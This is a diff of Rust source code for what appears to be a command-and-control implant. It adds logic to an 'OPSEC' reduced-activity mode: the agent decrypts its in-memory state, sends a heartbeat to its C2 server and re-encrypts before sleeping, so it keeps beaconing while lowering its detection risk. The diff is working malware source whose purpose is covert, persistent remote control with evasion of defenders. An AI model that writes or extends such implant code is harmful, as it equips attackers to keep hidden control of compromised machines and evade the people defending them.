@@ -104,8 +104,17 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 break; // Exit this loop to start agent_loop
             }
             AgentMode::ReducedActivity => {
-                info!("[OPSEC] Moderately high score. Entering ReducedActivity mode. Sleeping longer.");
-                // Ensure state is encrypted
+                info!("[OPSEC] Moderately high score. Entering ReducedActivity mode. Attempting heartbeat then sleeping longer.");
+                // Unencrypt for heartbeat
+                { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.unprotect(); }
+
+                if let Err(e) = crate::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
+                    error!("[OPSEC] Heartbeat failed in ReducedActivity (initial loop): {}. C2 failure counter updated internally.", e);
+                } else {
+                    info!("[OPSEC] Heartbeat successful in ReducedActivity (initial loop).");
+                }
+                
+                // Ensure state is encrypted before sleep
                 { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
                 std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)); 
             }
@@ -143,7 +152,19 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                     break; // Exit re-assessment loop, main loop will call agent_loop again
                 }
                 AgentMode::ReducedActivity => {
-                    info!("[OPSEC] High score after agent activity. Entering ReducedActivity mode.");
+                    info!("[OPSEC] High score after agent activity. Entering ReducedActivity mode. Attempting heartbeat then sleeping longer.");
+                    // Memory should be protected at this stage of the loop.
+                    // Unencrypt for heartbeat.
+                    { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.unprotect(); }
+
+                    if let Err(e) = crate::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
+                        error!("[OPSEC] Heartbeat failed in ReducedActivity (re-assessment loop): {}. C2 failure counter updated internally.", e);
+                    } else {
+                        info!("[OPSEC] Heartbeat successful in ReducedActivity (re-assessment loop).");
+                    }
+
+                    // Re-encrypt before sleep
+                    { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
                     std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)); 
                 }
                 AgentMode::FullOpsec => {
